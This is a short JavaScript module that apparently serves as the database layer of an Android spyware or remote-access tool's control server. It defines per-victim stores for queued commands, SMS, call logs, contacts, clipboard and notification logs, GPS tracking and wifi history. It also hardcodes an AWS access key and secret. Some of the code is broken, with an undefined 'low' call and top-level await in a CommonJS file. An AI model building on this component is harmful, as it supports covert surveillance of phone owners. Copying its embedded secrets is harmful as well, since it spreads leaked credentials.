const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
    path = require('path');

const S3 = require('@sadorlovsky/lowdb-s3')
const adapter = new S3({ bucket: 'bucket', key: 'db.json' }, {
    accessKeyId: 'AKIASBGNYCSMLKKUTOXO',
    secretAccessKey: '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',
    region: 'ap-south-1',
    endpoint: 'https://s3.ap-south-1.amazonaws.com'
})

const db = await low(adapter);

db.defaults({
    admin: {
        username: 'admin',
        password: '',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write()

class clientdb {
    constructor(clientID) {
        let cdb = lowdb(new FileSync(path.join(__dirname, '../clientData/') + clientID + '.json'))
        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: []
        }).write()
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};


